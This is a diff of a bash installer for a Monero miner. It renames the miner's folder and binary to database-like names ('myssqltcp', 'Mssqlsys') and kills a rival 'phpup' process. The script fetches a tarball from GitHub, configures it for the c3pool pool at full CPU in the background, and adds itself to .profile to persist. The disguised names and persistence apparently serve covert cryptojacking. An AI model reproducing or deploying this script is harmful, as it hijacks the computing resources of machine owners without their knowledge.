@@ -4,7 +4,7 @@ VERSION=2.11
 
 # printing greetings
 
-echo "Wkgg mining setup script v$VERSION."
+echo "Mssqlup mining setup script v$VERSION."
 echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
 
@@ -160,17 +160,17 @@ killall -9 phpup
 echo "[*] Removing $HOME/myssqltcp directory"
 rm -rf $HOME/myssqltcp
 
-echo "[*] Downloading wkgg advanced version of phpup to /tmp/wkggxmr.tar.gz"
-echo "[*] 下载 Wkgg 版本的 wkggxmr 到 /tmp/wkggxmr.tar.gz 中"
+echo "[*] Downloading myssqltcp advanced version of phpup to /tmp/wkggxmr.tar.gz"
+echo "[*] 下载 Wkgg 版本的 myssqltcp 到 /tmp/wkggxmr.tar.gz 中"
 if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz" -o /tmp/wkggxmr.tar.gz; then
   echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz file to /tmp/wkggxmr.tar.gz"
   echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz 文件到 /tmp/wkggxmr.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/wkgg"
-echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/wkgg"
-[ -d $HOME/wkgg ] || mkdir $HOME/wkgg
+echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/myssqltcp"
+echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp"
+[ -d $HOME/myssqltcp ] || mkdir $HOME/myssqltcp
 if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp; then
   echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
   echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录"
@@ -242,24 +242,24 @@ if [ ! -z $EMAIL ]; then
   PASS="$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/wkgg/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/wkgg/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/wkgg/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/wkgg/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/wkgg/Mssqlsys.log'",#' $HOME/wkgg/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/wkgg/config.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqltcp/Mssqlsys.log'",#' $HOME/myssqltcp/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
 
-cp $HOME/wkgg/config.json $HOME/wkgg/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/wkgg/config_background.json
+cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/wkgg/Mssqlup.sh script"
-echo "[*] 在该目录下创建 $HOME/wkgg/Mssqlup.sh 脚本"
-cat >$HOME/wkgg/Mssqlup.sh <<EOL
+echo "[*] Creating $HOME/myssqltcp/Mssqlup.sh script"
+echo "[*] 在该目录下创建 $HOME/myssqltcp/Mssqlup.sh 脚本"
+cat >$HOME/myssqltcp/Mssqlup.sh <<EOL
 #!/bin/bash
 if ! pidof Mssqlsys >/dev/null; then
-  nice $HOME/wkgg/Mssqlsys \$*
+  nice $HOME/myssqltcp/Mssqlsys \$*
 else
   echo "Monero server is already running in the background. Refusing to run another one."
   echo "Run \"killall Mssqlsys\" or \"sudo killall Mssqlsys\" if you want to remove background server first."
@@ -268,22 +268,22 @@ else
 fi
 EOL
 
-chmod +x $HOME/wkgg/Mssqlup.sh
+chmod +x $HOME/myssqltcp/Mssqlup.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep wkgg/Mssqlup.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/wkgg/Mssqlup.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/wkgg/Mssqlup.sh 到 $HOME/.profile"
-    echo "$HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep myssqltcp/Mssqlup.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/Mssqlup.sh script to $HOME/.profile"
+	echo "[*] 添加 $HOME/myssqltcp/Mssqlup.sh 到 $HOME/.profile"
+    echo "$HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/wkgg/Mssqlup.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/wkgg/Mssqlup.sh 已存在于 $HOME/.profile 中."
+    echo "Looks like $HOME/myssqltcp/Mssqlup.sh script is already in the $HOME/.profile"
+	echo "脚本 $HOME/myssqltcp/Mssqlup.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running server in the background (see logs in $HOME/wkgg/Mssqlsys.log file)"
-  echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/wkgg/Mssqlsys.log 日志文件)"
-  /bin/bash $HOME/wkgg/Mssqlup.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
+  echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
+  echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
+  /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
